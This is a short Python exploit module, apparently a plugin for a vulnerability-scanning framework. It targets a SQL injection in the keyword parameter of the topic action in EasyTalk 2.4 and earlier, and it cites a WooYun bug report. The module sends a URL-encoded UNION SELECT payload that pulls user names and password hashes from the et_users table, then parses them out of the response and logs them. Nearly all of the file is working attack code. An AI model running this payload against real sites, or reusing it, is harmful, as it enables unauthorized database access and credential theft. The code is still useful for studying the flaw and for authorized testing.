#!/usr/bin/env python
# -*- coding:utf-8 -*-

from lib import logger
from lib import requests

author = "Chu <root@sh3ll.me>"
scope = "EasyTalk -2.4"
description = "TopicAction.class.php 中 topic 函数 keyword 参数未过滤导致 SQL 注入"
reference = "http://www.wooyun.org/bugs/wooyun-2010-050338"
options = [
    {
        "Name": "URL",
        "Current Setting": "",
        "Required": True,
        "Description": "网站地址"
    },
    {
        "Name": "Cookie",
        "Current Setting": "",
        "Required": True,
        "Description": "Cookie"
    },
]


def exploit(URL, Cookie):
    logger.process("Requesting "+URL)
    url = URL + "/?m=topic&a=topic&keyword=a%27%20and%201=2%20union%20select" \
                "%201,2,3,concat(0x68616e64736f6d65636875,user_name,0x7e7e7e," \
                "password,0x68616e64736f6d65636875),5%20from%20et_users%23"
    r = requests.get(
        url=url,
        cookies=Cookie,
        timeout=5
    )
    r.close()
    if "handsomechu" in r.text:
        logger.success("Exploitable!")
        handsomechu = r.text.split("handsomechu")[1].split("~~~")
        username, password = handsomechu
        logger.success("Username: %s" % username)
        logger.success("Hash: %s" % password)
        return "%s: %s|%s" % (URL, username, password)
